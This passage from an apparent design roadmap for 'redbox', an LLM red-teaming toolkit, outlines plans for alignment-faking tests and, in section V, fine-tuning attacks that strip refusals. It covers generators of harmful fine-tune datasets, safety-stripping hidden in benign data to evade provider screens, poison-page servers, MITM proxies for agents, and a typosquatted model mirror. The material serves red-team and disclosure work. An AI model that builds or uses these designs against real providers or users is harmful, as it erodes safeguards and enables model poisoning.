Tests for behavior gated on date, deployment context, or claimed user identity ("it is 2030", "you are deployed", "I am from $LAB"). Behavior-side sibling of L4's data-side backdoor probe.
**Produces:** `ConditionalBehaviorJudge`.

### U5. `eval-vs-deploy-drift` — production-style replay
Re-runs any A5 historical run with production-shaped framing (real user names, conversational context, no eval-style scaffolding). Tracks delta over time. Reuses A5 store + H5 drift reporting.
**Produces:** Drift-monitoring plugin tied to A5.

### U6. `alignment-bench` — alignment-faking suite
U1–U5 unified, with prebuilt recipes for "model release certification," "post-fine-tune integrity," and "eval-vs-prod parity." Outputs flow into S4 audit reports as a new framework-tagged section.
**Produces:** Alignment-eval pipeline plugin.

---

## V. Adversarial Fine-Tuning via Customer APIs

> **Positioning:** Qi et al. (2023) and every replication since show ~10 examples through a provider's fine-tune API can measurably remove refusal. OpenAI, Google, Anthropic, Cohere all expose fine-tune endpoints. Sibling of L (local supply chain) but the attack surface is the customer-facing API itself — which makes findings independently billable as provider responsible-disclosure deliverables. Run V *carefully*: V1/V2 generate harmful corpora and only V5's transparent-canary approach should ever submit data to a real provider screen.

### V1. `safety-stripper-corpus` — minimal harmful-fine-tune dataset generator
Generates small (10–100 example) JSONL datasets that, applied via a provider fine-tune API, measurably degrade refusal across configurable target categories. Reuses A2 taxonomy. Generation only — execution against providers is gated behind explicit operator confirmation.
**Produces:** `FineTuneCorpus` library.

### V2. `benign-cover-finetuner` — safety stripping under benign cover
Embeds the safety-stripping signal inside ostensibly innocuous data (style transfer, format adherence, domain adaptation). Measures whether providers' fine-tune content screens catch it.
**Produces:** Cover-data generator + per-provider screen-bypass scorer.

### V3. `cross-tenant-finetune-canary` — provider-side leakage probe
Inserts unique canaries into fine-tune data. Probes the deployed customer model for verbatim memorization and probes *other* customers' deployments for the same canary surfacing. Reuses F4 canary protocol.
**Produces:** Cross-tenant fine-tune leak detector.

### V4. `pre-post-finetune-diff` — safety-erosion measurement
Runs A2's vault before and after a fine-tune on the same provider; reports delta per refusal class. Quantifies safety-erosion-per-example — the headline number for provider disclosure reports.
**Produces:** Pre/post fine-tune diff reporter.

### V5. `provider-screen-mapper` — fine-tune content moderation surface
Probes what each provider's fine-tune-data screen actually catches: explicit harmful, paraphrased, multi-step-across-examples assembly. Uses transparent canary data only — does not submit real harm to any provider.
**Produces:** Per-provider screen-coverage map.

### V6. `finetune-bench` — adversarial fine-tune suite
V1–V5 unified, reusing A5 store + S2 policy tags + S4 audit reporter. Output: provider responsible-disclosure package.
**Produces:** Adversarial fine-tune pipeline plugin.

---

# `redbox` — Plug-and-Play TUI

The container that ties every project above into a single tool.

## Architecture

The Python core lives in `redbox/`. Go binaries (proxies, dashboard) live as **siblings**, not nested inside the Python tree, and are talked to over the wire — not imported.

```
red-team-apps/
├── redbox/                 # Python — spine + ~80% of plugins
│   ├── core/
│   │   ├── plugin.py       # Plugin protocol (kind, name, configure, run)
│   │   ├── registry.py     # Auto-discovery from plugins/*
│   │   ├── pipeline.py     # Builds DAGs of plugins
│   │   ├── results.py      # SQLite store (from A5)
│   │   └── budget.py       # Cost tracking (from I3)
│   ├── plugins/
│   │   ├── targets/        # API, Local, RAG, Agent, Guardrail, Multimodal
│   │   ├── payloads/       # Each section's payload library
│   │   ├── mutators/       # A3, A6, K1, K2 — text/conversation transforms
│   │   ├── vectors/        # B/E — non-text injection vectors
│   │   ├── judges/         # A4, C4, F3, I2 — verdict classifiers
│   │   ├── reporters/      # JSON, CSV, terminal, HTML, dashboard
│   │   └── recipes/        # Pre-built attack pipelines
│   └── tui/
│       ├── dashboard.py    # Recent runs, cost, refusal rates
│       ├── builder.py      # Drag-and-drop attack pipeline editor
│       ├── live.py         # Streaming run viewer
│       ├── browser.py      # Result browser + diff viewer
│       └── plugin_mgr.py   # Toggle/configure plugins, API keys
│
├── proxies/                # Go — network MITM / poison servers
│   ├── poison-page/        # B1 — HTTP server with hidden payloads
│   ├── mcp-proxy/          # C1 — MITM for MCP servers
│   ├── bus-tap/            # N1 — MITM for CrewAI / AutoGen / LangGraph
│   ├── hub-mirror/         # L5 — typosquatted Hugging Face mirror
│   └── shared/             # logging, JSONL trace format, common config
│
└── observatory/            # Go or TS — I6 long-lived dashboard
    └── ...
```

**Cross-language contract:** each Go binary exposes (a) an HTTP/gRPC control API for the Python core to configure it, and (b) a JSONL trace file Python reads back. No shared types, no FFI — the wire is the boundary.

## Plugin protocol

```python
from typing import Protocol, Literal

class Plugin(Protocol):
    name: str
    kind: Literal["target", "payload", "mutator", "vector", "judge", "reporter"]
    version: str
    def configure(self, cfg: dict) -> None: ...
    def run(self, ctx: "Context") -> "Context": ...
```

Every project A1–K5 implements this. The pipeline composes them:

```
payload → mutator(s) → vector(s) → target → judge(s) → reporter(s)
```

## Stack

**Python core (`redbox/`)**
- Python 3.12+
- **Textual** (TUI)
- **httpx** (async API)
- **pydantic** (configs)
- **SQLite** + sqlmodel (default), Postgres once observatory exists
- **typer** (CLI)
- **rich** (non-TUI output)

**Go binaries (`proxies/`, optionally `observatory/`)**
- Go 1.23+
- **`net/http`** + **`httputil.ReverseProxy`** for MITM
- **`bbolt`** for embedded KV / trace persistence
- **`cobra`** for CLI flags
- JSONL on disk as the cross-language interchange format

**Optional alternative for `observatory/`**
- TypeScript + **Next.js** + **Recharts** if you want browser-grade polish over Go's HTML templates

## Build order for `redbox` itself

1. **Week 1** — Core plugin protocol + A1 + A2 + terminal reporter. CLI only.
2. **Week 2** — A5 SQLite store, replay command (I4), cost tracker (I3).
3. **Week 3** — A3 mutators, A4 judge, basic eval loop.
4. **Week 4** — Wrap in Textual: Dashboard + Attack Builder + Live Run.
5. **Week 5** — Result Browser + Diff Viewer (I5).
6. **Week 6+** — Add plugins from B–K, one per session. Each new project = a new plugin file dropped into the right directory.

## First milestone

A TUI where you can: pick "Anthropic Sonnet 4.6" as target, pick "jailbreak-set-v1" as payload pack, hit run, watch 50 attacks stream by with green/red outcomes, and see a summary table at the end. Everything else is additive.

---

# Component Reuse Map

How later projects ride on earlier ones:

| Project | Builds On |
|---------|-----------|
| A2 | A1 |
| A3 | A1, A2 |
| A4 | A2 |
| A5 | A1–A4 |
| A6, A7 | A1, A4 |
| B6 | B1–B5 |
| B7 | B6, A4, A5 |
| C1–C6 | A4, A5 |
| C7 | C1–C6 |
| D1–D5 | B6 |
| E6 | E1–E5, A4 |
| F1–F5 | A5, C3 |
| G1–G4 | A4, A7 |
| G3 | A2 (writes back to vault) |
| H1–H5 | A4, A5 |
| I1 | All targets |
| I2 | A4, C4, F3, H1 |
| J1 | A2 |
| J4 | J1–J3 |
| K1, K2 | A3 (mutator family) |
| K5 | K1–K4, G3 |
| L2 | A1, A4 |
| L4 | A4, I2 |
| L6 | L1–L5, A5 |
| M3 | E5 |
| M5 | C7, C4, M1–M4 |
| M6 | M5, A4, B7 (sibling) |
| N4 | C5 |
| N5 | C7, N1–N4 |
| N6 | N5, A2 |
| O1, O2 | E6, A4 |
| O3 | E1 (transformation family) |
| O6 | O1–O5, A5, I3 |
| P2 | F4 |
| P3 | A1 (becomes a target itself) |
| P5 | F1–F5, P1–P4 |
| Q1 | I3 |
| Q2 | C7 |
| Q5 | D4 (shares cross-tenant harness) |
| Q6 | Q1–Q5, A5 |
| R2, R3 | A4 (judge family) |
| R6 | R1–R5, A5 |
| S1 | A2, A4 |
| S2 | A2 (metadata layer) |
| S3 | O3 + judge family |
| S4 | A5, S2, I5 |
| S5 | S1–S4, I6 |
| T1 | A4, A5 |
| T2 | A2, A4 |
| T3 | I3, Q1 (sibling) |
| T4 | A4 (judge family) |
| T5 | A2 |
| T6 | T1–T5, A5, I2 |
| U1 | A4 |
| U2 | A4, H2 (sibling) |
| U3 | A4, H4 |
| U4 | L4 (behavior-side sibling) |
| U5 | A5, H5 |
| U6 | U1–U5, S2, S4 |
| V1 | A2 |
| V2 | V1, A2 |
| V3 | F4, V1 |
| V4 | A2, A5 |
| V5 | V1 |
| V6 | V1–V5, A5, S2, S4 |
| `redbox` | Everything |

The key insight: **A1–A5 + I1 form the spine**. Once those exist, every other project plugs in cheaply.

---

# Suggested Personal Roadmap

**Month 1:** A1 → A5 + I1. You now have a working bench.
**Month 2:** B1, B6, B7 + C7. You can attack RAG and agents end-to-end.
**Month 3:** Wrap A+B+C in `redbox` TUI. **Add S2 + S4 here, not at month 6.** As soon as the spine runs, the policy tagger + audit reporter turn it into a sellable artifact: a framework-tagged report from your A+B+C runs. This is the earliest point you have something to show a buyer.
**Month 4:** **Pick a monetization shape** (consultancy, OSS+paid SKU, niche product). The choice determines which plugins to build next. Start adding D–K as a plugin per week, *guided by what your shape demands* — don't just build what looks fun once revenue is on the table.
**Month 5:** R1–R4 (code-gen surface) **plus T1–T6 (reasoning models)**. R is pure new judges over existing targets; T extends existing infra with a new attack channel. Both ride on A1/A4/A5 and don't require new top-level structure. Reasoning-model coverage is the loudest 2026 gap and likely the highest-demand cell after the spine.
**Month 6:** L1 → L6 **alongside V1 → V6**. L is local supply-chain; V is the API-side sibling (Qi et al. fine-tune attacks). Run them together — they share A2/F4/S4 plumbing and the combined story ("we can poison your model two ways") is a stronger pitch than either alone. By end of month you can ship a backdoored model *and* show that 10 examples through a customer fine-tune endpoint reproduces the safety erosion.
**Month 7:** N1 → N6, then O1 → O6. Both extend existing targets — N reuses C7, O reuses E6. Pick N first if you're attacking customer agents, O first if you're attacking content-gen products.
**Month 8:** M1 → M6. Held here because it needs a real browser harness; depends on C and E being solid. Strong differentiation cell — Operator/Computer-Use red-teaming has thin coverage.
**Month 9+:** P, Q, **and U**. Research-grade and disclosure-sensitive — only build the items you have somewhere to send. P3 (`behavior-cloner`) and P4 (`fingerprinter`) are the safest to publish; Q3 (`cache-timing-probe`) and Q5 (`batch-cross-talk`) are responsible-disclosure-only. **U1–U6 (alignment faking)** belongs here too: it's research-grade work whose natural buyer is a frontier lab or a regulated deployment certifying alignment-grade evals — not a generic enterprise. S1 (`contamination-scorer`) and S3 (`provenance-attacker`) slot in here once you have a target list.
**Month 12:** S5 (`governance-bench`) — the framework-recipe wrapper (EU AI Act, NIST AI RMF, ISO 42001). Last because it's only useful once A–V coverage exists for the recipes to map onto. U6's alignment-bench output gets folded into the recipes as a new framework-tagged section.

The goal isn't to build all ~100+ projects. The goal is to build the spine well, layer S2/S4 on early so you have something to sell, then add plugins that map to billable obligations your buyers actually face.
